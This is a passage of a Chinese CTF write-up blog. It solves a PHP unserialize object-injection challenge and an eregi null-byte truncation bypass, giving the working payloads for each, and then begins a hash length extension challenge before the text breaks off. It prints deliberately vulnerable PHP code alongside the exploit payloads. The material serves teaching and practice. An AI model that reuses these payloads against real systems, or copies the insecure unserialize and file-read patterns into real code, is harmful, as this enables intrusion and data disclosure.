punctuation\">)</span> <span class=\"token operator\">&amp;&amp;</span> <span class=\"token variable\">$g</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'class'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n\t<span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token operator\">!</span><span class=\"token keyword\">empty</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$g</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n\t\t<span class=\"token variable\">$x</span> <span class=\"token operator\">=</span> <span class=\"token function\">unserialize</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$g</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\t<span class=\"token punctuation\">&#125;</span>\n\t<span class=\"token keyword\">echo</span> <span class=\"token variable\">$x</span><span class=\"token operator\">-></span><span class=\"token function\">readfile</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token delimiter important\">?></span></span>\n<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>img</span> <span class=\"token attr-name\">src</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>showimg.php?img=c2hpZWxkLmpwZw==<span class=\"token punctuation\">\"</span></span> <span class=\"token attr-name\">width</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>100%<span class=\"token punctuation\">\"</span></span><span class=\"token punctuation\">/></span></span>\n\n<span class=\"token comment\">&lt;!-- shield.php --></span>\n\n<span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span>\n\t<span class=\"token comment\">//flag is in pctf.php</span>\n\t<span class=\"token keyword\">class</span> <span class=\"token class-name-definition class-name\">Shield</span> <span class=\"token punctuation\">&#123;</span>\n\t\t<span class=\"token keyword\">public</span> <span class=\"token variable\">$file</span><span class=\"token punctuation\">;</span>\n\t\t<span class=\"token keyword\">function</span> <span class=\"token function-definition function\">__construct</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$filename</span> <span class=\"token operator\">=</span> <span class=\"token string single-quoted-string\">''</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n\t\t\t<span class=\"token variable\">$this</span> <span class=\"token operator\">-></span> <span class=\"token property\">file</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$filename</span><span class=\"token punctuation\">;</span>\n\t\t<span class=\"token punctuation\">&#125;</span>\n\t\t\n\t\t<span class=\"token keyword\">function</span> <span class=\"token function-definition function\">readfile</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n\t\t\t<span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token operator\">!</span><span class=\"token keyword\">empty</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$this</span><span class=\"token operator\">-></span><span class=\"token property\">file</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">&amp;&amp;</span> <span class=\"token function\">stripos</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$this</span><span class=\"token operator\">-></span><span class=\"token property\">file</span><span class=\"token punctuation\">,</span><span class=\"token string single-quoted-string\">'..'</span><span class=\"token punctuation\">)</span><span class=\"token operator\">===</span><span class=\"token constant boolean\">FALSE</span>  \n\t\t\t<span class=\"token operator\">&amp;&amp;</span> <span class=\"token function\">stripos</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$this</span><span class=\"token operator\">-></span><span class=\"token property\">file</span><span class=\"token punctuation\">,</span><span class=\"token string single-quoted-string\">'/'</span><span class=\"token punctuation\">)</span><span class=\"token operator\">===</span><span class=\"token constant boolean\">FALSE</span> <span class=\"token operator\">&amp;&amp;</span> <span class=\"token function\">stripos</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$this</span><span class=\"token operator\">-></span><span class=\"token property\">file</span><span class=\"token punctuation\">,</span><span class=\"token string single-quoted-string\">'\\\\'</span><span class=\"token punctuation\">)</span><span class=\"token operator\">==</span><span class=\"token constant boolean\">FALSE</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n\t\t\t\t<span class=\"token keyword\">return</span> @<span class=\"token function\">file_get_contents</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$this</span><span class=\"token operator\">-></span><span class=\"token property\">file</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\t\t\t<span class=\"token punctuation\">&#125;</span>\n\t\t<span class=\"token punctuation\">&#125;</span>\n\t<span class=\"token punctuation\">&#125;</span>\n<span class=\"token delimiter important\">?></span></span>\n\n<span class=\"token comment\">&lt;!-- showimg.php --></span>\n<span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span>\n\t<span class=\"token variable\">$f</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'img'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n\t<span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token operator\">!</span><span class=\"token keyword\">empty</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$f</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n\t\t<span class=\"token variable\">$f</span> <span class=\"token operator\">=</span> <span class=\"token function\">base64_decode</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$f</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\t\t<span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token function\">stripos</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$f</span><span class=\"token punctuation\">,</span><span class=\"token string single-quoted-string\">'..'</span><span class=\"token punctuation\">)</span><span class=\"token operator\">===</span><span class=\"token constant boolean\">FALSE</span> <span class=\"token operator\">&amp;&amp;</span> <span class=\"token function\">stripos</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$f</span><span class=\"token punctuation\">,</span><span class=\"token string single-quoted-string\">'/'</span><span class=\"token punctuation\">)</span><span class=\"token operator\">===</span><span class=\"token constant boolean\">FALSE</span> <span class=\"token operator\">&amp;&amp;</span> <span class=\"token function\">stripos</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$f</span><span class=\"token punctuation\">,</span><span class=\"token string single-quoted-string\">'\\\\'</span><span class=\"token punctuation\">)</span><span class=\"token operator\">===</span><span class=\"token constant boolean\">FALSE</span>\n\t\t<span class=\"token comment\">//stripos — 查找字符串首次出现的位置（不区分大小写）</span>\n\t\t<span class=\"token operator\">&amp;&amp;</span> <span class=\"token function\">stripos</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$f</span><span class=\"token punctuation\">,</span><span class=\"token string single-quoted-string\">'pctf'</span><span class=\"token punctuation\">)</span><span class=\"token operator\">===</span><span class=\"token constant boolean\">FALSE</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n\t\t\t<span class=\"token function\">readfile</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$f</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\t\t<span class=\"token punctuation\">&#125;</span> <span class=\"token keyword\">else</span> <span class=\"token punctuation\">&#123;</span>\n\t\t\t<span class=\"token keyword\">echo</span> <span class=\"token string double-quoted-string\">\"File not found!\"</span><span class=\"token punctuation\">;</span>\n\t\t<span class=\"token punctuation\">&#125;</span>\n\t<span class=\"token punctuation\">&#125;</span>\n<span class=\"token delimiter important\">?></span></span>\n\n<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n<p>showing.php中不允许传<code>pctf</code>，因此我们这里需要找其他点，我们发现开头的<code>$x = new Shield();</code>，此时的$x中的filename是空的，如果把他修改为<code>pctf.php</code>，后面再进行echo的时候不就可以成功读这个flag文件了吗，因此构造脚本如下</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\"><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span> \n<span class=\"token function\">show_source</span><span class=\"token punctuation\">(</span><span class=\"token constant\">__FILE__</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\t<span class=\"token keyword\">require_once</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'shield.php'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\t<span class=\"token variable\">$x</span> <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">Shield</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\t<span class=\"token variable\">$g</span><span class=\"token operator\">=</span> <span class=\"token function\">serialize</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$x</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\t<span class=\"token keyword\">echo</span> <span class=\"token variable\">$g</span><span class=\"token punctuation\">;</span>\n<span class=\"token delimiter important\">?></span></span>\n<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>img</span> <span class=\"token attr-name\">src</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>showimg.php?img=c2hpZWxkLmpwZw==<span class=\"token punctuation\">\"</span></span> <span class=\"token attr-name\">width</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>100%<span class=\"token punctuation\">\"</span></span><span class=\"token punctuation\">/></span></span>\n\n<span class=\"token comment\">&lt;!-- shield.php --></span>\n\n<span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span>\n\t<span class=\"token comment\">//flag is in pctf.php</span>\n\t<span class=\"token keyword\">class</span> <span class=\"token class-name-definition class-name\">Shield</span> <span class=\"token punctuation\">&#123;</span>\n\t\t<span class=\"token keyword\">public</span> <span class=\"token variable\">$file</span><span class=\"token punctuation\">;</span>\n\t\t<span class=\"token keyword\">function</span> <span class=\"token function-definition function\">__construct</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$filename</span> <span class=\"token operator\">=</span> <span class=\"token string single-quoted-string\">'pctf.php'</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n\t\t\t<span class=\"token variable\">$this</span> <span class=\"token operator\">-></span> <span class=\"token property\">file</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$filename</span><span class=\"token punctuation\">;</span>\n\t\t<span class=\"token punctuation\">&#125;</span>\n\t\t\n\t\t<span class=\"token keyword\">function</span> <span class=\"token function-definition function\">readfile</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n\t\t\t<span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token operator\">!</span><span class=\"token keyword\">empty</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$this</span><span class=\"token operator\">-></span><span class=\"token property\">file</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">&amp;&amp;</span> <span class=\"token function\">stripos</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$this</span><span class=\"token operator\">-></span><span class=\"token property\">file</span><span class=\"token punctuation\">,</span><span class=\"token string single-quoted-string\">'..'</span><span class=\"token punctuation\">)</span><span class=\"token operator\">===</span><span class=\"token constant boolean\">FALSE</span>  \n\t\t\t<span class=\"token operator\">&amp;&amp;</span> <span class=\"token function\">stripos</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$this</span><span class=\"token operator\">-></span><span class=\"token property\">file</span><span class=\"token punctuation\">,</span><span class=\"token string single-quoted-string\">'/'</span><span class=\"token punctuation\">)</span><span class=\"token operator\">===</span><span class=\"token constant boolean\">FALSE</span> <span class=\"token operator\">&amp;&amp;</span> <span class=\"token function\">stripos</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$this</span><span class=\"token operator\">-></span><span class=\"token property\">file</span><span class=\"token punctuation\">,</span><span class=\"token string single-quoted-string\">'\\\\'</span><span class=\"token punctuation\">)</span><span class=\"token operator\">==</span><span class=\"token constant boolean\">FALSE</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n\t\t\t\t<span class=\"token keyword\">return</span> @<span class=\"token function\">file_get_contents</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$this</span><span class=\"token operator\">-></span><span class=\"token property\">file</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\t\t\t<span class=\"token punctuation\">&#125;</span>\n\t\t<span class=\"token punctuation\">&#125;</span>\n\t<span class=\"token punctuation\">&#125;</span>\n<span class=\"token delimiter important\">?></span></span>\n<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n<p>得到</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\"><span class=\"token constant\">O</span><span class=\"token punctuation\">:</span><span class=\"token number\">6</span><span class=\"token punctuation\">:</span><span class=\"token string double-quoted-string\">\"Shield\"</span><span class=\"token punctuation\">:</span><span class=\"token number\">1</span><span class=\"token punctuation\">:</span><span class=\"token punctuation\">&#123;</span>s<span class=\"token punctuation\">:</span><span class=\"token number\">4</span><span class=\"token punctuation\">:</span><span class=\"token string double-quoted-string\">\"file\"</span><span class=\"token punctuation\">;</span>s<span class=\"token punctuation\">:</span><span class=\"token number\">8</span><span class=\"token punctuation\">:</span><span class=\"token string double-quoted-string\">\"pctf.php\"</span><span class=\"token punctuation\">;</span><span class=\"token punctuation\">&#125;</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n<p>赋值给class即可，最终payload如下</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\"><span class=\"token keyword\">class</span><span class=\"token operator\">=</span><span class=\"token constant\">O</span><span class=\"token punctuation\">:</span><span class=\"token number\">6</span><span class=\"token punctuation\">:</span><span class=\"token string double-quoted-string\">\"Shield\"</span><span class=\"token punctuation\">:</span><span class=\"token number\">1</span><span class=\"token punctuation\">:</span><span class=\"token punctuation\">&#123;</span>s<span class=\"token punctuation\">:</span><span class=\"token number\">4</span><span class=\"token punctuation\">:</span><span class=\"token string double-quoted-string\">\"file\"</span><span class=\"token punctuation\">;</span>s<span class=\"token punctuation\">:</span><span class=\"token number\">8</span><span class=\"token punctuation\">:</span><span class=\"token string double-quoted-string\">\"pctf.php\"</span><span class=\"token punctuation\">;</span><span class=\"token punctuation\">&#125;</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n<h2 id=\"eregi函数漏洞\"><a href=\"#eregi函数漏洞\" class=\"headerlink\" title=\"eregi函数漏洞\"></a>eregi函数漏洞</h2><pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\"><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span>\n<span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token operator\">!</span><span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'id'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n\t<span class=\"token function\">header</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'Location:\n  index.php?id=1'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\t<span class=\"token keyword\">exit</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">&#125;</span>\n<span class=\"token variable\">$id</span><span class=\"token operator\">=</span><span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'id'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n<span class=\"token variable\">$a</span><span class=\"token operator\">=</span><span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'a'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n<span class=\"token variable\">$b</span><span class=\"token operator\">=</span><span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'b'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token function\">stripos</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$a</span><span class=\"token punctuation\">,</span><span class=\"token string single-quoted-string\">'.'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> \n\t<span class=\"token keyword\">echo</span> <span class=\"token string single-quoted-string\">'Hahahahahaha'</span><span class=\"token punctuation\">;</span>\n\t<span class=\"token keyword\">return</span> <span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">&#125;</span>\n<span class=\"token variable\">$data</span> <span class=\"token operator\">=</span> @<span class=\"token function\">file_get_contents</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$a</span><span class=\"token punctuation\">,</span><span class=\"token string single-quoted-string\">'r'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$data</span><span class=\"token operator\">==</span><span class=\"token string double-quoted-string\">\"1112 is a nice lab!\"</span> <span class=\"token keyword\">and</span> <span class=\"token variable\">$id</span><span class=\"token operator\">==</span><span class=\"token number\">0</span> <span class=\"token keyword\">and</span> <span class=\"token function\">strlen</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$b</span><span class=\"token punctuation\">)</span><span class=\"token operator\">></span><span class=\"token number\">5</span> <span class=\"token keyword\">and</span> <span class=\"token function\">eregi</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"111\"</span><span class=\"token operator\">.</span><span class=\"token function\">substr</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$b</span><span class=\"token punctuation\">,</span><span class=\"token number\">0</span><span class=\"token punctuation\">,</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span><span class=\"token string double-quoted-string\">\"1114\"</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">and</span> <span class=\"token function\">substr</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$b</span><span class=\"token punctuation\">,</span><span class=\"token number\">0</span><span class=\"token punctuation\">,</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token operator\">!=</span><span class=\"token number\">4</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n\t<span class=\"token keyword\">require</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"flag.txt\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">&#125;</span> <span class=\"token keyword\">else</span> <span class=\"token punctuation\">&#123;</span>\n\t<span class=\"token keyword\">print</span> <span class=\"token string double-quoted-string\">\"work harder!harder!harder!\"</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">&#125;</span>\n<span class=\"token delimiter important\">?></span></span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n<p>条件</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\"><span class=\"token number\">1</span>、<span class=\"token variable\">$data</span><span class=\"token operator\">==</span><span class=\"token string double-quoted-string\">\"1112 is a nice lab!\"</span> \n<span class=\"token number\">2</span>、 <span class=\"token variable\">$id</span><span class=\"token operator\">==</span><span class=\"token number\">0</span> \n<span class=\"token number\">3</span>、<span class=\"token function\">strlen</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$b</span><span class=\"token punctuation\">)</span><span class=\"token operator\">></span><span class=\"token number\">5</span> \n<span class=\"token number\">4</span>、<span class=\"token function\">eregi</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"111\"</span><span class=\"token operator\">.</span><span class=\"token function\">substr</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$b</span><span class=\"token punctuation\">,</span><span class=\"token number\">0</span><span class=\"token punctuation\">,</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span><span class=\"token string double-quoted-string\">\"1114\"</span><span class=\"token punctuation\">)</span>\n<span class=\"token number\">5</span>、 <span class=\"token function\">substr</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$b</span><span class=\"token punctuation\">,</span><span class=\"token number\">0</span><span class=\"token punctuation\">,</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token operator\">!=</span><span class=\"token number\">4</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n<p>第一个，data来源于变量a，因此我们这里赋值<code>a=1112 is a nice lab!</code>即可实现<br>第二个，id参数来源于变量id，我们这里同理给它赋值<code>id=0</code>即可<br>第三个，长度大于5，接着看b的条件<br>第四个，截取b参数的第一位，同时将114和b的第一位进行拼接，在1114中<br>第五个，要求b参数的第一位不能是4</p>\n<p>四五看起来是矛盾的，但查阅相关资料后，发现eregi函数存在空字符截断漏洞，即参数中的正则表达式或待匹配字符串遇到空字符则截断丢弃后面的数据。<br>简单的说就是当遇见%00后，后面的不再看了<br>这里当我们给b赋值为<code>%001</code>的时候，它就会拼接这个%00，但函数处理时，会自动处理掉空格，同时后面的1不看，此时的它也就还是<code>111</code>,因为111是在1114中的，所以此时就可以绕过，不过我们还需要注意一下第三个条件，要求长度大于5，因此我们这里后面多添几个数字就可以，构造最终payload如下</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\">a<span class=\"token operator\">=</span><span class=\"token number\">1112</span> is a nice lab<span class=\"token operator\">!</span><span class=\"token operator\">&amp;</span>b<span class=\"token operator\">=</span><span class=\"token operator\">%</span><span class=\"token number\">0012345</span><span class=\"token operator\">&amp;</span>id<span class=\"token operator\">=</span><span class=\"token number\">0</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n<h2 id=\"哈希长度扩展攻击\"><a href=\"#哈希长度扩展攻击\" class=\"headerlink\" title=\"哈希长度扩展攻击\"></a>哈希长度扩展攻击</h2><pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\"><span class=\"token doctype\"><span class=\"token punctuation\">&lt;!</span><span class=\"token doctype-tag\">DOCTYPE</span> <span class=\"token name\">html</span><span class=\"token punctuation\">></span></span>\n<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>html</span><span class=\"token punctuation\">></span></span>\n<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>head</span><span class=\"token punctuation\">></span></span>\n<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>title</span><span class=\"token punctuation\">></span></span>Web 350<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>title</span><span class=\"token punctuation\">></span></span>\n<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>style</span> <span class=\"token attr-name\">type</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>text/css<span class=\"token punctuation\">\"</span></span><span class=\"token punctuation\">></span></span><span class=\"token style\"><span class=\"token language-css\">\n        <span class=\"token selector\">body</span> <span class=\"token punctuation\">&#123;</span>\n                <span class=\"token property\">background</span><span class=\"token punctuation\">:</span>gray<span class=\"token punctuation\">;</span>\n                <span class=\"token property\">text-align</span><span class=\"token punctuation\">:</span>center<span class=\"token punctuation\">;</span>\n        <span class=\"token punctuation\">&#125;</span>\n</span></span><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>style</span><span class=\"token punctuation\">></span></span>\n<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>head</span><span class=\"token punctuation\">></span></span>\n\n<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>body</span><span class=\"token punctuation\">></span></span>\n        <span class=\"token prolog\">&lt;?php\n                $auth = false;\n                $role = \"guest\";\n                $salt =\n                if (isset($_COOKIE[\"role\"])) &#123;\n                        $role = unserialize($_COOKIE[\"role\"]);\n                        $hsh = $_COOKIE[\"hsh\"];\n                        if ($role===\"admin\" &amp;&amp; $hsh === md5($salt.strrev($_COOKIE[\"role\"])))\n// strrev返回 string 反转后的字符串。 \n                         &#123;\n                                $auth = true;\n                        &#125; else &#123;\n                                $auth = false;\n                        &#125;\n                &#125; else &#123;\n                        $s = serialize($role);\n                        setcookie('role',$s);\n                        $hsh = md5($salt.strrev($s));\n                        setcookie('hsh',$hsh);\n                &#125;\n                if ($auth) &#123;\n                        echo \"&lt;h3>Welcome Admin. Your flag is \n                &#125; else &#123;\n                        echo \"&lt;h3>Only Admin can see the flag!!&lt;/h3>\";\n                &#125;\n        ?></span>\n        \n<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>body</span><span class=\"token punctuation\">></span></span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n<p>原题环境<br><a href=\"http://web.jarvisoj.com:32778/\">http://web.jarvisoj.com:32778/</a><br>这里的话看一下条件</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\"><span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token keyword\">isset</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_COOKIE</span><span class=\"token punctuation\">[</span><span class=\"token string double-quoted-string\">\"role\"</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n                        <span class=\"token variable\">$role</span> <span class=\"token operator\">=</span> <span class=\"token function\">unserialize</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_COOKIE</span><span class=\"token punctuation\">[</span><span class=\"token string double-quoted-string\">\"role\"</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n                        <span class=\"token variable\">$hsh</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$_COOKIE</span><span class=\"token punctuation\">[</span><span class=\"token string double-quoted-string\">\"hsh\"</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n                        <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token variable\">$role</span><span class=\"token operator\">===</span><span class=\"token string double-quoted-string\">\"admin\"</span> <span class=\"token operator\">&amp;&amp;</span> <span class=\"token variable\">$hsh</span> <span class=\"token operator\">===</span> <span class=\"token function\">md5</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$salt</span><span class=\"token operator\">.</span><span class=\"token function\">strrev</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_COOKIE</span><span class=\"token punctuation\">[</span><span class=\"token string double-quoted-string\">\"role\"</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span></span></code></pre>\n<p>这些条件满足才能使得变量auth为true，才会输出flag，此时看最重要的一个语句</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\"><span class=\"token variable\">$role</span><span class=\"token operator\">===</span><span class=\"token string double-quoted-string\">\"admin\"</span> <span class=\"token operator\">&amp;&amp;</span> <span class=\"token variable\">$hsh</span> <span class=\"token operator\">===</span> <span class=\"token function\">md5</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$salt</span><span class=\"token operator\">.</span><span class=\"token function\">strrev</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_COOKIE</span><span class=\"token punctuation\">[</span><span class=\"token string double-quoted-string\">\"role\"</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n<p>先看后面<br>左边是我们通过cookie传入的<code>$hsh</code><br>右边是我们通过cookie传入的role经过反转和盐值拼接再经md5加密的结果，这个值需要与<code>$hsh</code>相等<br>这个看起来是不可能实现的，我们不知道这个盐值的值，虽然hsh和role都可控，但想实现结果与hsh相等仍是十分困难的</p>\n<blockquote><span class=\"custom-blockquote-svg\"><svg width=\"24\" height=\"24\" viewBox=\"0 0 24 24\" fill=\"\" xmlns=\"http://www.w3.org/2000/svg\" 